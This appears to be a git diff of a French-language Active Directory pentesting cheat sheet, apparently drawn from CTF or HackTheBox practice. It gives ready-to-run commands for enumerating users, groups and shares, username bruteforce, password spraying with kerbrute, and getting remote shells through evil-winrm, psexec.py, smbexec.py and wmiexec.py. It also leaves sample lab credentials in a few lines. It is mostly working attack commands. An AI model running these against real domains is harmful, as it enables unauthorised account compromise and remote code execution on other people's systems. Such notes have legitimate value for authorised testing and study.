@@ -30,16 +30,23 @@ $> querydominfo
 ldapsearch -h $TARGET_IP -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
 ```
 
-## Découverte de comptes utilisateurs
+## Comptes utilisateurs
+### Découverte
 
-### Listing
+#### Listing
 
-#### SMB
+##### SMB
 
 ```shell
 # crackmapexec
+## Utilisateurs connus (AD / Station)
 cme smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --users | tr -s ' ' | tail -n +4 | cut -d ' ' -f 5 | cut -d '\' -f 2 | tee users.txt
 ```
+```shell
+## Utilisateurs connectés sur la station
+cme smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --loggedon-users 
+```
+
 ```shell
 # enum4linux
 enum4linux -u "" -p "" -U $TARGET_IP | grep user: | cut -d '[' -f2 | cut -d ']' -f1  | tee users.txt
@@ -48,7 +55,7 @@ enum4linux -u "" -p "" -U $TARGET_IP | grep user: | cut -d '[' -f2 | cut -d ']' 
 rpcclient -U "" -N $TARGET_IP -c 'enumdomusers;quit' | grep user: | cut -d '[' -f2 | cut -d ']' -f1  | tee users.txt
 ```
 
-#### LDAP
+##### LDAP
 
 ```shell
 # crackmapexec
@@ -58,7 +65,7 @@ cme ldap -u $AD_USER -p $AD_PASSWORD $TARGET_IP -dc-ip $TARGET_IP --users
 ldapsearch -h $TARGET_IP -x -b "DC=DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -d ' ' -f2
 ```
 
-### Découverte par bruteforce
+#### Bruteforce
 
 On pourra utiliser la liste des noms d'utilisateurs les plus communs provenant de https://github.com/insidetrust/statistically-likely-usernames
 Par exemple le fichier : https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jsmith.txt
@@ -72,11 +79,11 @@ Cet utilitaire tente très rapidement tous les mots de passes de la liste.
 Il ne génère par d'évènement dans un AD configuré avec les options par défaut.
 
 
-## Attaques sur des comptes utilisateurs
+#### Attaques
 
 Lorsqu'on dispose d'une liste de comptes utilisateurs, on peut ensuite essayer de trouver leur mots de passe associés.
 
-### Password Spraying
+##### Password Spraying
 
 **Attention** :
 - toujours vérifier la politique de mot de passe en place (voir plus haut) avant de tenter un password spraying.
@@ -97,12 +104,21 @@ kerbrute passwordspray -d $AD_DOMAIN --dc $TARGET_IP users.txt  "$AD_PASSWORD"
 ```
 
 
-#### Partages
+## Groupes
+
+```shell
+# Liste de tous les groupes
+cme smb $TARGET_IP -u "" -p "" --groups
+# Liste des membres d'un groupe
+cme smb $TARGET_IP -u "" -p "" --groups "Domain Admins"
+```
+
+## Partages
 ##### Enumération
 
 ```shell
-cme smb $TARGET -u "" -p "" --shares
-cme smb $TARGET_IP -u "sql_svc" -p "REGGIE1234ronnie" -d "sequel"  --shares | cut -c60-
+cme smb $TARGET_IP -u "" -p "" --shares
+cme smb $TARGET_IP -u "$AD_USER" -p "$AD_PASSWORD" -d "$AD_DOMAIN"  --shares | cut -c60-
 ```
 
 ```shell
@@ -160,6 +176,7 @@ smbmap -u "" -p "" -H $TARGET_IP
 
 # Liste de façon récursive les fichiers d'un partage (indique si les droits sont en écriture ou en lecture)
 smbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP -R "$SHARE/"
+smbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP -R "$SHARE/" --dir-only
 
 # Téléchargement d'un fichier 
 $ smbmap -u "" -p "" -H $TARGET_IP --download  "sambashare\contents\flag.txt"
@@ -171,27 +188,57 @@ smbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP --upload desktop.
 
 ### Explorer les partages 
 
+#### crackmapexec
 ```bash
-# Lister tous les fichiers de tous les partages
 rm -rf /tmp/cme_spider_plus # dossier contenant les résultats du module spider_plus
-cme smb $TARGET_IP -u $AD_USER -p "$AD_PASSWORD" -M spider_plus 
-cat /tmp/cme_spider_plus/*.json | jq '. | to_entries | .[] | {share: .key, file: .value | to_entries | .[].key} | "\(.share) | \(.file)"' | tee $TARGET_IP-share_files.txt
 
+# soit Lister tous les fichiers de tous les partages
+cme smb $TARGET_IP -u $AD_USER -p "$AD_PASSWORD" -M spider_plus 
+# soit Lister tous les fichiers de tous les partages
+cme smb $TARGET_IP -u $AD_USER -p "$AD_PASSWORD" -M spider_plus --share 'Some Share'
+
+# Affichage des résultats 
+cat /tmp/cme_spider_plus/*.json | jq '. | to_entries | .[] | {share: .key, file: .value | to_entries | .[].key} | "\(.share) | \(.file)"' | tee $TARGET_IP-share_files.txt
 ```
 
+#### smbmap
+
+```shell
+smbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP -R "$SHARE/" --dir-only
+```
 ## Shell
+
+### WinRM
+
 ```shell
 # Vérification d'accès WINRM
-cme winrm $TARGET_IP -u "$AD_USER" -p "$AD_PASSWORD" -d "$AD_DOMAIN"  | cut -c60-
-2     [*] http://10.10.11.202:5985/wsman
-2     [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 (Pwn3d!)
-
+cme winrm $TARGET_IP -u "$AD_USER" -p "$AD_PASSWORD" -d "$AD_DOMAIN"  | cut -c61-
+     [*] http://10.10.1.55:5985/wsman
+     [+] domain.local\User:Mypass (Pwn3d!)
 # Obtention du shell via evil-winrm
 evil-winrm -i $TARGET_IP -u "$AD_USER" -p "$AD_PASSWORD"
 ```
 
-## Bloodhound
+### RPC + SMB
+
+Exécute un shell distant en tant que SYSTEM
+```shell
+# Nécessite l'accès au partage Admin$ + RPC pour la communication
+psexec.py $AD_DOMAIN/$AD_USER:"$AD_PASSWORD"@$TARGET_IP
+# Nécessite l'accès à un partage quelconque + RPC pour la communication
+smbexec.py $AD_DOMAIN/$AD_USER:"$AD_PASSWORD"@$TARGET_IP
 ```
+
+### WMI
+
+Exécute un shell semi interactif (spawn un cmd.exe a chaque exécution de commande).
+Fourni un accès avec le compte utilisateur utilisé ($AD_USER)
+```shell
+wmiexec.py $AD_DOMAIN/$AD_USER:"$AD_PASSWORD"@$TARGET_IP
+```
+
+## Bloodhound
+
 # Bloodhound python injector available as a docker image (python2)
 sudo docker run --rm -v ${PWD}:/bloodhound-data -it bloodhound 
 $ bloodhound-python  -u 'svc_apache' -p 'S@Ss!K@*t13' -c All -d 'flight.htb' -v -ns 10.10.11.187
